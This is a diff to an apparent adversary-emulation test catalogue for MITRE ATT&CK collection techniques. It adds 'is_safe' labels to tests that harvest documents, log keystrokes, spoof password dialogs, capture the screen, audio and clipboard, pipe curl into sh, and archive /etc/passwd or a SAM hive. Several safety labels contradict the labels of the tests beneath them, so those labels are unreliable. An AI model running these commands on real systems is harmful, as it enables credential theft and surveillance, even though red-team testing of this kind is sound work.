@@ -20,6 +20,7 @@
       command: "$startingDirectory = \"C:\\Users\"\n$outputZip = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1005\"\n$fileExtensionsString = \".doc, .docx, .txt\" \n$fileExtensions = $fileExtensionsString -split \", \"\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null\n\nFunction Search-Files {\n  param (\n    [string]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n    $fileExtensions -contains $_.Extension.ToLower()\n  }\n  return $files\n}\n\n$foundFiles = Search-Files -directory $startingDirectory\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName\n  Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\"\n\n  Write-Host \"Zip file created: $outputZip\\data.zip\"\n  } else {\n      Write-Host \"No files found with the specified extensions.\"\n  }"
       cleanup: Remove-Item -Path  $outputZip\data.zip -Force
       timeout: 120
+      is_safe: true
     - name: Find and dump sqlite databases (Linux)
       type: bash
       platform: linux
@@ -35,15 +36,17 @@
         rm -f $HOME/gta.db
         rm -f $HOME/sqlite_dump.sh
       timeout: 60
+      is_safe: true
     - name: Copy Apple Notes database files using AppleScript
       type: sh
       platform: macos
       command: osascript -e 'tell application "Finder"' -e 'set destinationFolderPath to POSIX file "/private/tmp"' -e 'set notesFolderPath to (path to home folder as text) & "Library:Group Containers:group.com.apple.notes:"' -e 'set notesFolder to folder notesFolderPath' -e 'set notesFiles to {file "NoteStore.sqlite", file "NoteStore.sqlite-shm", file "NoteStore.sqlite-wal"} of notesFolder' -e 'repeat with aFile in notesFiles' -e 'duplicate aFile to folder destinationFolderPath with replacing' -e 'end' -e 'end tell'
       cleanup: rm "/private/tmp/NoteStore.sqlite*"
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1005
-  is_safe: false
+  is_safe: true
 - id: T1025
   name: Data from Removable Media
   description: "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. \n\nSome adversaries may also use [Automated Collection](https://attack.mitre.or..."
@@ -58,9 +61,10 @@
       platform: windows
       command: powershell.exe -c "Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }"
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1025
-  is_safe: false
+  is_safe: true
 - id: T1039
   name: Data from Network Shared Drive
   description: Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.
@@ -79,6 +83,7 @@
         del %TEMP%\Easter_egg.password
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Copy a sensitive File over Administrative share with Powershell
       type: powershell
       platform: windows
@@ -88,6 +93,7 @@
         Remove-Item -Path "$Env:TEMP\Easter_egg.password"
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1039
   is_safe: false
@@ -110,6 +116,7 @@
       cleanup: Remove-Item $env:TEMP\key.log -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Living off the land Terminal Input Capture on Linux with pam.d
       type: sh
       platform: linux
@@ -125,6 +132,7 @@
         sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Logging bash history to syslog
       type: sh
       platform: linux
@@ -135,6 +143,7 @@
       cleanup: unset PROMPT_COMMAND
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Logging sh history to syslog/messages
       type: sh
       platform: linux
@@ -145,6 +154,7 @@
       cleanup: unset PS2
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Bash session based keylogger
       type: bash
       platform: linux
@@ -154,6 +164,7 @@
         cat /tmp/.keyboard.log
       cleanup: rm /tmp/.keyboard.log
       timeout: 60
+      is_safe: true
     - name: SSHD PAM keylogger
       type: sh
       platform: linux
@@ -161,6 +172,7 @@
       cleanup: cp -fv /tmp/sshd /etc/pam.d/
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Auditd keylogger
       type: sh
       platform: linux
@@ -168,15 +180,17 @@
       cleanup: systemctl restart auditd
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: MacOS Swift Keylogger
       type: bash
       platform: macos
       command: swift PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift -keylog
       cleanup: kill `pgrep swift-frontend`
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1056/001
-  is_safe: false
+  is_safe: true
 - id: T1056.002
   name: GUI Input Capture
   description: |-
@@ -197,11 +211,13 @@
       platform: macos
       command: osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"'
       timeout: 60
+      is_safe: true
     - name: PowerShell - Prompt User for Password
       type: powershell
       platform: windows
       command: "# Creates GUI to prompt for password. Expect long pause before prompt is available.    \n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password"
       timeout: 120
+      is_safe: true
     - name: AppleScript - Spoofing a credential prompt using osascript
       type: bash
       platform: macos
@@ -209,9 +225,10 @@
         PWD_SPOOF=$(osascript -e 'display dialog "To perform a security update MacOS needs your passphrase." with title "MacOS Security Update" default answer "" with icon stop with hidden answer')
         echo $PWD_SPOOF
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1056/002
-  is_safe: false
+  is_safe: true
 - id: T1056.004
   name: Credential API Hooking
   description: 'Adversaries may hook into Windows application programming interface (API) functions and Linux system functions to collect user credentials. Malicious hooking mechanisms may capture API or function calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001), this technique focuses specifically on API functions that include parameters that reveal user creden...'
@@ -232,6 +249,7 @@
         Invoke-WebRequest https://www.example.com -UseBasicParsing
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1056/004
   is_safe: false
@@ -253,27 +271,31 @@
       command: Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile $env:TEMP\discovery.bat
       cleanup: Remove-Item -Force $env:TEMP\discovery.bat -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Stage data from Discovery.sh
       type: sh
       platform: linux
       command: curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > /tmp/T1074.001_discovery.log
       cleanup: rm /tmp/T1074.001_discovery.log
       timeout: 60
+      is_safe: true
     - name: Stage data from Discovery.sh
       type: sh
       platform: macos
       command: curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > /tmp/T1074.001_discovery.log
       cleanup: rm /tmp/T1074.001_discovery.log
       timeout: 60
+      is_safe: true
     - name: Zip a Folder with PowerShell for Staging in Temp
       type: powershell
       platform: windows
       command: Compress-Archive -Path "PathToAtomicsFolder\T1074.001\bin\Folder_to_zip" -DestinationPath $env:TEMP\Folder_to_zip.zip -Force
       cleanup: Remove-Item -Path $env:TEMP\Folder_to_zip.zip -ErrorAction Ignore
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1074/001
-  is_safe: false
+  is_safe: true
 - id: T1113
   name: Screen Capture
   description: 'Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)'
@@ -289,12 +311,14 @@
       command: screencapture /tmp/T1113_desktop.png
       cleanup: rm /tmp/T1113_desktop.png
       timeout: 60
+      is_safe: true
     - name: Screencapture (silent)
       type: bash
       platform: macos
       command: screencapture -x /tmp/T1113_desktop.png
       cleanup: rm /tmp/T1113_desktop.png
       timeout: 60
+      is_safe: true
     - name: X Windows Capture
       type: bash
       platform: linux
@@ -303,6 +327,7 @@
         xwud -in /tmp/T1113_desktop.xwd
       cleanup: rm /tmp/T1113_desktop.xwd
       timeout: 60
+      is_safe: true
     - name: X Windows Capture (freebsd)
       type: sh
       platform: linux
@@ -311,18 +336,21 @@
         xwud -in /tmp/T1113_desktop.xwd
       cleanup: rm /tmp/T1113_desktop.xwd
       timeout: 60
+      is_safe: true
     - name: Capture Linux Desktop using Import Tool
       type: bash
       platform: linux
       command: import -window root /tmp/T1113_desktop.png
       cleanup: rm /tmp/T1113_desktop.png
       timeout: 60
+      is_safe: true
     - name: Capture Linux Desktop using Import Tool (freebsd)
       type: sh
       platform: linux
       command: import -window root /tmp/T1113_desktop.png
       cleanup: rm /tmp/T1113_desktop.png
       timeout: 60
+      is_safe: true
     - name: Windows Screencapture
       type: powershell
       platform: windows
@@ -333,6 +361,7 @@
         cmd /c "timeout 5 > NULL && psr.exe /stop"
       cleanup: rm c:\temp\T1113_desktop.zip -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Windows Screen Capture (CopyFromScreen)
       type: powershell
       platform: windows
@@ -345,6 +374,7 @@
         $bitmap.Save("$env:TEMP\T1113.png")
       cleanup: Remove-Item $env:TEMP\T1113.png -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Windows Recall Feature Enabled - DisableAIDataAnalysis Value Deleted
       type: powershell
       platform: windows
@@ -354,6 +384,7 @@
       cleanup: reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI" /v DisableAIDataAnalysis /t REG_DWORD /d 1 /f
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: RDP Bitmap Cache Extraction via bmc-tools
       type: powershell
       platform: windows
@@ -362,9 +393,10 @@
         Remove-Item "$env:TEMP\bmc-tools.py" -ErrorAction SilentlyContinue
         Remove-Item $env:TEMP\rdp_screens -Recurse -Force -ErrorAction SilentlyContinue
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1113
-  is_safe: false
+  is_safe: true
 - id: T1114.001
   name: Local Email Collection
   description: |-
@@ -381,9 +413,10 @@
       command: powershell -executionpolicy bypass -command "PathToAtomicsFolder\T1114.001\src\Get-Inbox.ps1" -file $env:TEMP\mail.csv
       cleanup: Remove-Item $env:TEMP\mail.csv -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1114/001
-  is_safe: false
+  is_safe: true
 - id: T1115
   name: Clipboard Data
   description: "Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>.(Citation: MSDN Clipboard)(Citation: clip_win_server)(Citation: CISA_AA21_200B) Additionally, adversaries may monitor then replace users’ clipboard with their data (e.g., [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).(Citat..."
@@ -402,6 +435,7 @@
         clip < %temp%\T1115.txt
       cleanup: del %temp%\T1115.txt >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Execute Commands from Clipboard using PowerShell
       type: powershell
       platform: windows
@@ -409,6 +443,7 @@
         echo Get-Process | clip
         Get-Clipboard | iex
       timeout: 120
+      is_safe: true
     - name: Execute commands from clipboard
       type: bash
       platform: macos
@@ -416,6 +451,7 @@
         echo ifconfig | pbcopy
         $(pbpaste)
       timeout: 60
+      is_safe: true
     - name: Collect Clipboard Data via VBA
       type: powershell
       platform: windows
@@ -426,6 +462,7 @@
         Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"
       cleanup: Remove-Item "$env:TEMP\atomic_T1115_clipboard_data.txt" -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Add or copy content to clipboard with xClip
       type: sh
       platform: linux
@@ -434,9 +471,10 @@
         history | tail -n 30 | xclip -sel clip
         xclip -o > history.txt
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1115
-  is_safe: false
+  is_safe: true
 - id: T1119
   name: Automated Collection
   description: "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, t..."
@@ -455,6 +493,7 @@
         for /R c:\ %f in (*.docx) do copy /Y %f %temp%\T1119_command_prompt_collection
       cleanup: del %temp%\T1119_command_prompt_collection /F /Q >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Automated Collection PowerShell
       type: powershell
       platform: windows
@@ -463,6 +502,7 @@
         Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}
       cleanup: Remove-Item $env:TEMP\T1119_powershell_collection -Force -ErrorAction Ignore | Out-Null
       timeout: 120
+      is_safe: true
     - name: Recon information for export with PowerShell
       type: powershell
       platform: windows
@@ -475,6 +515,7 @@
         Remove-Item $env:TEMP\T1119_2.txt -ErrorAction Ignore
         Remove-Item $env:TEMP\T1119_3.txt -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Recon information for export with Command Prompt
       type: cmd
       platform: windows
@@ -489,9 +530,10 @@
         del %TEMP%\T1119_3.txt >nul 2>&1
         del %TEMP%\T1119_4.txt >nul 2>&1
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1119
-  is_safe: false
+  is_safe: true
 - id: T1123
   name: Audio Capture
   description: |-
@@ -512,6 +554,7 @@
         Set-AudioDevice -ID $mic.ID
         Start-Sleep -Seconds 5
       timeout: 120
+      is_safe: true
     - name: Registry artefact when application use microphone
       type: cmd
       platform: windows
@@ -520,6 +563,7 @@
         reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
       cleanup: reg DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /f
       timeout: 120
+      is_safe: true
     - name: using Quicktime Player
       type: sh
       platform: macos
@@ -529,9 +573,10 @@
           rm /tmp/T1123.m4a
         fi
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1123
-  is_safe: false
+  is_safe: true
 - id: T1125
   name: Video Capture
   description: |-
@@ -552,9 +597,10 @@
         reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
       cleanup: reg DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /f
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1125
-  is_safe: false
+  is_safe: true
 - id: T1560
   name: Archive Collected Data
   description: |-
@@ -573,9 +619,10 @@
       command: dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\T1560-data-ps.zip
       cleanup: Remove-Item -path $env:USERPROFILE\T1560-data-ps.zip -ErrorAction Ignore
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1560
-  is_safe: false
+  is_safe: true
 - id: T1560.001
   name: Archive via Utility
   description: "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <cod..."
@@ -591,6 +638,7 @@
       command: '"%programfiles%/WinRAR/Rar.exe" a -r %USERPROFILE%\T1560.001-data.rar %USERPROFILE%\*.txt'
       cleanup: del /f /q /s %USERPROFILE%\T1560.001-data.rar >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Compress Data and lock with password for Exfiltration with winrar
       type: cmd
       platform: windows
@@ -601,6 +649,7 @@
         "%programfiles%/WinRAR/Rar.exe" a -hp"blue" hello.rar
         dir
       timeout: 120
+      is_safe: true
     - name: Compress Data and lock with password for Exfiltration with winzip
       type: cmd
       platform: windows
@@ -612,6 +661,7 @@
         "%ProgramFiles%\WinZip\winzip64.exe" -min -a -s"hello" archive.zip *
         dir
       timeout: 120
+      is_safe: true
     - name: Compress Data and lock with password for Exfiltration with 7zip
       type: cmd
       platform: windows
@@ -623,6 +673,7 @@
         dir
       cleanup: rmdir /s /Q $PathToAtomicsFolder\T1560.001\victim-files >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Data Compressed - nix - zip
       type: bash
       platform: linux
@@ -630,6 +681,7 @@
       cleanup: rm -f $HOME/data.zip
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Data Compressed - nix - zip
       type: bash
       platform: macos
@@ -637,30 +689,35 @@
       cleanup: rm -f $HOME/data.zip
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Data Compressed - nix - gzip Single File
       type: sh
       platform: linux
       command: 'test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo ''confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101'' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)'
       cleanup: rm -f $HOME/victim-gzip.txt.gz
       timeout: 60
+      is_safe: true
     - name: Data Compressed - nix - gzip Single File
       type: sh
       platform: macos
       command: 'test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo ''confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101'' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)'
       cleanup: rm -f $HOME/victim-gzip.txt.gz
       timeout: 60
+      is_safe: true
     - name: Data Compressed - nix - tar Folder or File
       type: sh
       platform: linux
       command: tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME
       cleanup: rm -f $HOME/data.tar.gz
       timeout: 60
+      is_safe: true
     - name: Data Compressed - nix - tar Folder or File
       type: sh
       platform: macos
       command: tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME
       cleanup: rm -f $HOME/data.tar.gz
       timeout: 60
+      is_safe: true
     - name: Data Encrypted with zip and gpg symmetric
       type: sh
       platform: linux
@@ -672,6 +729,7 @@
         ls -l /tmp/T1560
       cleanup: rm -Rf /tmp/T1560
       timeout: 60
+      is_safe: true
     - name: Data Encrypted with zip and gpg symmetric
       type: sh
       platform: macos
@@ -683,18 +741,21 @@
         ls -l /tmp/T1560
       cleanup: rm -Rf /tmp/T1560
       timeout: 60
+      is_safe: true
     - name: Encrypts collected data with AES-256 and Base64
       type: bash
       platform: linux
       command: "zip -r  /tmp/t1560/t1560_data.zip /tmp/t1560\nopenssl enc -aes-256-cbc -pass pass:atomic_enc_pass -p -in /tmp/t1560/t1560_data.zip -out /tmp/t1560/t1560_data.enc \ncat /tmp/t1560/t1560_data.enc | base64"
       cleanup: rm -rf /tmp/t1560
       timeout: 60
+      is_safe: true
     - name: Encrypts collected data with AES-256 and Base64
       type: bash
       platform: macos
       command: "zip -r  /tmp/t1560/t1560_data.zip /tmp/t1560\nopenssl enc -aes-256-cbc -pass pass:atomic_enc_pass -p -in /tmp/t1560/t1560_data.zip -out /tmp/t1560/t1560_data.enc \ncat /tmp/t1560/t1560_data.enc | base64"
       cleanup: rm -rf /tmp/t1560
       timeout: 60
+      is_safe: true
     - name: ESXi - Remove Syslog remote IP
       type: powershell
       platform: windows
@@ -707,12 +768,14 @@
         rm c:\temp\loghost.txt
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Compress a File for Exfiltration using Makecab
       type: cmd
       platform: windows
       command: makecab.exe C:\Temp\sam.hiv C:\Temp\art.zip
       cleanup: del C:\Temp\art.zip
       timeout: 120
+      is_safe: true
     - name: Copy and Compress AppData Folder
       type: powershell
       platform: windows
@@ -735,9 +798,10 @@
         [System.IO.Compression.ZipFile]::CreateFromDirectory($Copy, $Zip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1560/001
-  is_safe: false
+  is_safe: true
 - id: T1560.002
   name: Archive via Library
   description: |-
@@ -758,6 +822,7 @@
         $which_python -c "import gzip;input_file=open('/etc/passwd', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('/tmp/passwd.gz','wb',compresslevel=6);output_file.write(content);output_file.close();"
       cleanup: rm /tmp/passwd.gz
       timeout: 60
+      is_safe: true
     - name: Compressing data using bz2 in Python (FreeBSD/Linux)
       type: sh
       platform: linux
@@ -766,6 +831,7 @@
         $which_python -c "import bz2;input_file=open('/etc/passwd','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('/tmp/passwd.bz2','w+');output_file.write(str(bz2content));output_file.close();"
       cleanup: rm /tmp/passwd.bz2
       timeout: 60
+      is_safe: true
     - name: Compressing data using zipfile in Python (FreeBSD/Linux)
       type: sh
       platform: linux
@@ -774,6 +840,7 @@
         $which_python -c "from zipfile import ZipFile; ZipFile('/tmp/passwd.zip', mode='w').write('/etc/passwd')"
       cleanup: rm /tmp/passwd.zip
       timeout: 60
+      is_safe: true
     - name: Compressing data using tarfile in Python (FreeBSD/Linux)
       type: sh
       platform: linux
@@ -782,6 +849,7 @@
         $which_python -c "import tarfile; output_file = tarfile.open('/tmp/passwd.tar.gz','w'); output_file.add('/etc/passwd'); output_file.close()"
       cleanup: rm /tmp/passwd.tar.gz
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1560/002
-  is_safe: false
+  is_safe: true
